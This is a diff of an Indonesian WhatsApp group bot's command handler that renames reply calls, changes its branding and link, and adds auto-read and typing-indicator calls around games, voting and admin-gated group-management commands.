@@ -35,7 +35,7 @@ const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
 const barat = moment.tz('Asia/Jakarta').format('HH:mm:ss')
 const tengah = moment.tz('Asia/Makassar').format('HH:mm:ss')
 const timur = moment.tz('Asia/Jayapura').format('HH:mm:ss')
-const nyoutube = ('©assistant bots')  //ubah di config biar ngk emro
+const nyoutube = ('©© OchoBot')  //ubah di config biar ngk emro
 const SatganzDevsyt = ('*ɴᴏᴛᴇ  :*\n*• ʙᴏᴛ ᴍᴀsɪʜ ᴅᴀʟᴀᴍ ᴛᴀʜᴀᴘ ᴘᴇʀᴋᴇᴍʙᴀɴɢᴀɴ ᴊɪᴋᴀ ᴀᴅᴀ ʙᴜɢ sɪʟᴀʜᴋɴ ʟᴀᴘᴏʀ ᴋᴇ ᴏᴡɴᴇʀ.*')  //ubah di config biar ngk emror
 const ini_mark = `0@s.whatsapp.net`
 
@@ -222,7 +222,7 @@ SatganzDevs.sendMessageV2 = async(chatId, message, options = {}) => {
 				body: "JOIN GROUP SINI", 
 				thumbnail: thumb,
 				mediaType: 2,
- 			   mediaUrl: myytv,
+ 			   mediaUrl: 'https://bit.ly/3uumZI6',
 				sourceUrl: "https://bit.ly/3uumZI6"}}}, {quoted: m})
 				}
 const replay = (teks) => {
@@ -287,14 +287,14 @@ sendMenuDoc = async (ID, doc, fileName, fileLength, caption, footer, time, butto
 	  // Anti Link
         if (db.data.chats[m.chat].antilink) {
         if (budy.match(`chat.whatsapp.com`)) {
-        m.reply(`「 *ANTI LINK* 」\n\n*Kamu terdeteksi mengirim link group*, *maaf kamu akan di kick‼️,yang mau juga silahkan kirim link‼️*`)
-        if (!isBotAdmins) return m.reply(`*Bot aja bukan admin anj*`)
+        reply(`「 *ANTI LINK* 」\n\n*Kamu terdeteksi mengirim link group*, *maaf kamu akan di kick‼️,yang mau juga silahkan kirim link‼️*`)
+        if (!isBotAdmins) return reply(`*Bot aja bukan admin anj*`)
         let gclink = (`https://chat.whatsapp.com/`+await SatganzDevs.groupInviteCode(m.chat))
         let isLinkThisGc = new RegExp(gclink, 'i')
         let isgclink = isLinkThisGc.test(m.text)
-        if (isgclink) return m.reply(`*maaf gak jadi, karena kamu ngirim link group ini*`)
-        if (isAdmins) return m.reply(`*maaf kamu admin*`)
-        if (isCreator) return m.reply(`*maaf kamu owner bot ku*`)
+        if (isgclink) return reply(`*maaf gak jadi, karena kamu ngirim link group ini*`)
+        if (isAdmins) return reply(`*maaf kamu admin*`)
+        if (isCreator) return reply(`*maaf kamu owner bot ku*`)
         SatganzDevs.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
         }
         }
@@ -355,16 +355,16 @@ ${Array.from(room.jawaban, (jawaban, index) => {
             if (budy.toLowerCase() == jawaban) {
                 await SatganzDevs.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, SatganzDevs.user.name, m)
                 delete tebaklagu[m.sender.split('@')[0]]
-            } else m.reply('*Jawaban Salah!*')
+            } else reply('*Jawaban Salah!*')
         }
 
         if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
             kuis = true
             jawaban = kuismath[m.sender.split('@')[0]]
             if (budy.toLowerCase() == jawaban) {
-                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
+                await reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                 delete kuismath[m.sender.split('@')[0]]
-            } else m.reply('*Jawaban Salah!*')
+            } else reply('*Jawaban Salah!*')
         }
         
         if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
@@ -373,7 +373,7 @@ ${Array.from(room.jawaban, (jawaban, index) => {
             if (budy.toLowerCase() == jawaban) {
                 await SatganzDevs.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, SatganzDevs.user.name, m)
                 delete tebakkata[m.sender.split('@')[0]]
-            } else m.reply('*Jawaban Salah!*')
+            } else reply('*Jawaban Salah!*')
         }
 
         if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
@@ -384,7 +384,7 @@ ${Array.from(room.jawaban, (jawaban, index) => {
                 await SatganzDevs.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, SatganzDevs.user.name, m)
                 delete caklontong[m.sender.split('@')[0]]
 		delete caklontong_desk[m.sender.split('@')[0]]
-            } else m.reply('*Jawaban Salah!*')
+            } else reply('*Jawaban Salah!*')
         }
 
         if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
@@ -393,7 +393,7 @@ ${Array.from(room.jawaban, (jawaban, index) => {
             if (budy.toLowerCase() == jawaban) {
                 await SatganzDevs.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, SatganzDevs.user.name, m)
                 delete tebakkalimat[m.sender.split('@')[0]]
-            } else m.reply('*Jawaban Salah!*')
+            } else reply('*Jawaban Salah!*')
         }
 
         if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
@@ -402,7 +402,7 @@ ${Array.from(room.jawaban, (jawaban, index) => {
             if (budy.toLowerCase() == jawaban) {
                 await SatganzDevs.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, SatganzDevs.user.name, m)
                 delete tebaklirik[m.sender.split('@')[0]]
-            } else m.reply('*Jawaban Salah!*')
+            } else reply('*Jawaban Salah!*')
         }
 	    
 	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
@@ -411,7 +411,7 @@ ${Array.from(room.jawaban, (jawaban, index) => {
             if (budy.toLowerCase() == jawaban) {
                 await SatganzDevs.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, SatganzDevs.user.name, m)
                 delete tebaktebakan[m.sender.split('@')[0]]
-            } else m.reply('*Jawaban Salah!*')
+            } else reply('*Jawaban Salah!*')
         }
         
         //TicTacToe
@@ -422,14 +422,14 @@ ${Array.from(room.jawaban, (jawaban, index) => {
 	    let isWin = !1
 	    let isTie = !1
 	    let isSurrender = !1
-	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
+	    // reply(`[DEBUG]\n${parseInt(m.text)}`)
 	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
 	    isSurrender = !/^[1-9]$/.test(m.text)
 	    if (m.sender !== room.game.currentTurn) { // nek wayahku
 	    if (!isSurrender) return !0
 	    }
 	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
-	    m.reply({
+	    reply({
 	    '-3': 'Game telah berakhir',
 	    '-2': 'Invalid',
 	    '-1': 'Posisi Invalid',
@@ -523,13 +523,13 @@ klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] }
 	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
 	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
 	    roof.text = m.text
-	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
+	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
 	    if (!roof.pilih2) SatganzDevs.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
 	    }
 	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
 	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
 	    roof.text2 = m.text
-	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
+	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
 	    if (!roof.pilih) SatganzDevs.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
 	    }
 	    let stage = roof.pilih
@@ -559,19 +559,22 @@ klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] }
             let afkTime = user.afkTime
             if (!afkTime || afkTime < 0) continue
             let reason = user.afkReason || ''
-            m.reply(`
+            reply(`
 Jangan tag dia!
 Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
 Selama ${clockString(new Date - afkTime)}
 `.trim())
         }
-
+  
+  SatganzDevs.readMessages([m.key])
+		SatganzDevs.sendPresenceUpdate('available', m.chat)
+		SatganzDevs.sendPresenceUpdate('composing', m.chat)
         switch(command) {
 	    case 'afk': {
                 let user = global.db.data.users[m.sender]
                 user.afkTime = + new Date
                 user.afkReason = text
-                m.reply(`${m.pushName} *Telah Afk*${text ? ': ' + text : ''}`)
+                reply(`${m.pushName} *Telah Afk*${text ? ': ' + text : ''}`)
             }
             break	
  case 'ttc': case 'ttt': case 'tictactoe': {
@@ -581,7 +584,7 @@ Selama ${clockString(new Date - afkTime)}
             if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
             let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
             if (room) {
-            m.reply('Partner ditemukan!')
+            reply('Partner ditemukan!')
             room.o = m.chat
             room.game.playerO = m.sender
             room.state = 'PLAYING'
@@ -620,7 +623,7 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
             state: 'WAITING'
             }
             if (text) room.name = text
-            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
+            reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
             this.game[room.id] = room
             }
             }
@@ -632,10 +635,10 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
             delete this.game
             SatganzDevs.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
             } else if (!this.game) {
-            m.reply(`Session TicTacToe🎮 tidak ada`)
+            reply(`Session TicTacToe🎮 tidak ada`)
             } else throw '?'
             } catch (e) {
-            m.reply('rusak')
+            reply('rusak')
             }
             }
             break
@@ -644,9 +647,9 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
             let poin = 10
             let poin_lose = 10
             let timeout = 60000
-            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
-	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
-            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
+            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Selesaikan suit mu yang sebelumnya`)
+	    if (m.mentionedJid[0] === m.sender) return reply(`Tidak bisa bermain dengan diri sendiri !`)
+            if (!m.mentionedJid[0]) return reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
             if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
             let id = 'suit_' + new Date() * 1
             let caption = `_*SUIT PvP*_
@@ -668,47 +671,47 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
             }
             break
             case 'bot': {
-                m.reply('Apa?su')
+                reply('Apa?su')
             }
             break
             case 'asalamualaikum': {
-                m.reply('Waalaikumsalam')
+                reply('Waalaikumsalam')
             }
             case 'hehe': {
-                m.reply('Fitur Yang Eror Akan Segera Mimin Benerin\nSabar Ya:/')
+                reply('Fitur Yang Eror Akan Segera Mimin Benerin\nSabar Ya:/')
             }
             break
             case 'groupbot': {
-                m.reply('Halo Kak\nGroup SatganzDevsBotz: https://chat.whatsapp.com/CigmOAZApWZDWnAKAHQ5Ju\nNOTE : Kalo kakak nya Punya Bot Masukin aja\n\n*_Makasih><_*')
+                reply('Halo Kak\nGroup SatganzDevsBotz: https://chat.whatsapp.com/CigmOAZApWZDWnAKAHQ5Ju\nNOTE : Kalo kakak nya Punya Bot Masukin aja\n\n*_Makasih><_*')
             }
             break
             case 'tqto': {
-                m.reply('THANK TO :\nDikaArdnt: https://github.com/DikaArdnt\nSatganzDevs: https://github.com/SatganzDevsdev\nRonove: https://github.com/ralfh19\nRifza: https://github.com/rifza123')
+                reply('THANK TO :\nDikaArdnt: https://github.com/DikaArdnt\nSatganzDevs: https://github.com/SatganzDevsdev\nRonove: https://github.com/ralfh19\nRifza: https://github.com/rifza123')
             }
             break
             case 'chat': {
                 if (!isCreator) throw mess.owner
                 if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                 if (args[0] === 'mute') {
-                    SatganzDevs.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    SatganzDevs.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 } else if (args[0] === 'unmute') {
-                    SatganzDevs.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    SatganzDevs.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 } else if (args[0] === 'archive') {
-                    SatganzDevs.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    SatganzDevs.chatModify({  archive: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 } else if (args[0] === 'unarchive') {
-                    SatganzDevs.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    SatganzDevs.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 } else if (args[0] === 'read') {
-                    SatganzDevs.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    SatganzDevs.chatModify({ markRead: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 } else if (args[0] === 'unread') {
-                    SatganzDevs.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    SatganzDevs.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 } else if (args[0] === 'delete') {
-                    SatganzDevs.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    SatganzDevs.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 }
             }
             break
 	    case 'family100': {
                 if ('family100'+m.chat in _family100) {
-                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
+                    reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                     throw false
                 }
                 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
@@ -727,7 +730,7 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
             if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
             ter = command[1].toLowerCase()
             tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
-            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
+            reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
             break
             case 'tebak': {
                 if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
@@ -826,7 +829,7 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                 await sleep(result.waktu)
                 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                     console.log("Jawaban: " + result.jawaban)
-                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
+                    reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                     delete kuismath[m.sender.split('@')[0]]
                 }
             }
@@ -887,14 +890,14 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                 if (!isCreator) throw mess.owner
                 if (!text) throw 'Masukkan Link Group!'
                 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
-                m.reply(mess.wait)
+                reply(mess.wait)
                 let result = args[0].split('https://chat.whatsapp.com/')[1]
-                await SatganzDevs.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                await SatganzDevs.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
             }
             break
             case 'leave': {
                 if (!isCreator) throw mess.owner
-                await SatganzDevs.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                await SatganzDevs.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
             }
             break
             case 'setexif': {
@@ -902,7 +905,7 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                if (!text) throw `Example : ${prefix + command} packname|author`
           global.packname = text.split("|")[0]
           global.author = text.split("|")[1]
-          m.reply(`Exif berhasil diubah menjadi\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
+          reply(`Exif berhasil diubah menjadi\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
             }
             break
 	case 'kick': {
@@ -910,7 +913,7 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await SatganzDevs.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await SatganzDevs.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 	}
 	break
 	case 'add': {
@@ -918,7 +921,7 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
 		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await SatganzDevs.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await SatganzDevs.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 	}
 	break
 	case 'promote': {
@@ -926,7 +929,7 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await SatganzDevs.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await SatganzDevs.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 	}
 	break
 	case 'demote': {
@@ -934,19 +937,19 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await SatganzDevs.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await SatganzDevs.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 	}
 	break
         case 'block': {
 		if (!isCreator) throw mess.owner
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await SatganzDevs.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await SatganzDevs.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 	}
 	break
         case 'unblock': {
 		if (!isCreator) throw mess.owner
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await SatganzDevs.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await SatganzDevs.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 	}
 	break
 	    case 'setname': case 'setsubject': {
@@ -954,7 +957,7 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
                 if (!text) throw 'Text ?'
-                await SatganzDevs.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
+                await SatganzDevs.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
             }
             break
           case 'setdesc': case 'setdesk': {
@@ -962,7 +965,7 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
                 if (!text) throw 'Text ?'
-                await SatganzDevs.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
+                await SatganzDevs.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
             }
             break
           case 'setppbot': {
@@ -972,7 +975,7 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                 if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                 let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted)
                 await SatganzDevs.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
-                m.reply(mess.success)
+                reply(mess.success)
                 }
                 break
            case 'setppgroup': case 'setppgrup': case 'setppgc': {
@@ -983,7 +986,7 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                 if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                 let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted)
                 await SatganzDevs.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
-                m.reply(mess.success)
+                reply(mess.success)
                 }
                 break
             case 'tagall': {
@@ -1015,14 +1018,14 @@ let teks = `══✪〘 *👥 Tag All* 〙✪══
                 for (let i of anu) {
                     teks += `• *${i.name}* : ${i.result}\n\n`
                 }
-                m.reply(teks)
+                reply(teks)
 	    }
 	    break
                case 'vote': {
             if (!m.isGroup) throw mess.group
             if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
             if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
-            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
+            reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
             vote[m.chat] = [q, [], []]
             await sleep(1000)
             upvote = vote[m.chat][1]
@@ -1177,7 +1180,7 @@ break
             if (!m.isGroup) throw mess.group
             if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
             delete vote[m.chat]
-            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
+            reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
 	    }
             break
                case 'group': case 'grup': {
@@ -1185,9 +1188,9 @@ break
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
                 if (args[0] === 'close'){
-                    await SatganzDevs.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*Sukses Menutup Group*`)).catch((err) => m.reply(jsonformat(err)))
+                    await SatganzDevs.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`*Sukses Menutup Group*`)).catch((err) => reply(jsonformat(err)))
                 } else if (args[0] === 'open'){
-                    await SatganzDevs.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*Sukses Membuka Group*`)).catch((err) => m.reply(jsonformat(err)))
+                    await SatganzDevs.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`*Sukses Membuka Group*`)).catch((err) => reply(jsonformat(err)))
                 } else {
                 let buttons = [
                         { buttonId: 'group open', buttonText: { displayText: 'Open kh?' }, type: 1 },
@@ -1203,9 +1206,9 @@ break
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
              if (args[0] === 'open'){
-                await SatganzDevs.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Sukses Membuka Edit Info Group*`)).catch((err) => m.reply(jsonformat(err)))
+                await SatganzDevs.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`*Sukses Membuka Edit Info Group*`)).catch((err) => reply(jsonformat(err)))
              } else if (args[0] === 'close'){
-                await SatganzDevs.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Sukses Menutup Edit Info Group*`)).catch((err) => m.reply(jsonformat(err)))
+                await SatganzDevs.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`*Sukses Menutup Edit Info Group*`)).catch((err) => reply(jsonformat(err)))
              } else {
              let buttons = [
                         { buttonId: 'editinfo open', buttonText: { displayText: 'Open kh?' }, type: 1 },
@@ -1217,21 +1220,21 @@ break
             }
             break
             case 'antidelete': {
-if (!m.isGroup) return m.reply(mess.group)
-if (!isBotAdmins) return m.reply(mess.botAdmin)
-if (!isAdmins && !isCreator) return m.reply(mess.admin)
-if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
+if (!m.isGroup) return reply(mess.group)
+if (!isBotAdmins) return reply(mess.botAdmin)
+if (!isAdmins && !isCreator) return reply(mess.admin)
+if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
 if (args[0] === "on") {
-if (AntiDelete) return m.reply('Sudah Aktif')
+if (AntiDelete) return reply('Sudah Aktif')
 ntidel.push(from)
-m.reply('Succes menyalakan antidelete di group ini')
+reply('Succes menyalakan antidelete di group ini')
 } else if (args[0] === "off") {
-if (!AntiDelete) return m.reply('Sudah Mati')
+if (!AntiDelete) return reply('Sudah Mati')
 let off = ntidel.indexOf(from)
 ntidel.splice(off, 1)
-m.reply('Succes mematikan antidelete di group ini')
+reply('Succes mematikan antidelete di group ini')
 } else {
-m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
+reply('on untuk mengaktifkan, off untuk menonaktifkan')
 }
 }
 break
@@ -1240,13 +1243,13 @@ if (!m.isGroup) throw mess.group
 if (!isBotAdmins) throw mess.botAdmin
 if (!isAdmins) throw mess.admin
 if (args[0] === "on") {
-if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
+if (db.data.chats[m.chat].antilink) return reply(`Sudah Aktif Sebelumnya`)
 db.data.chats[m.chat].antilink = true
-m.reply(`Antilink Aktif !`)
+reply(`Antilink Aktif !`)
 } else if (args[0] === "off") {
-if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
+if (!db.data.chats[m.chat].antilink) return reply(`Sudah Tidak Aktif Sebelumnya`)
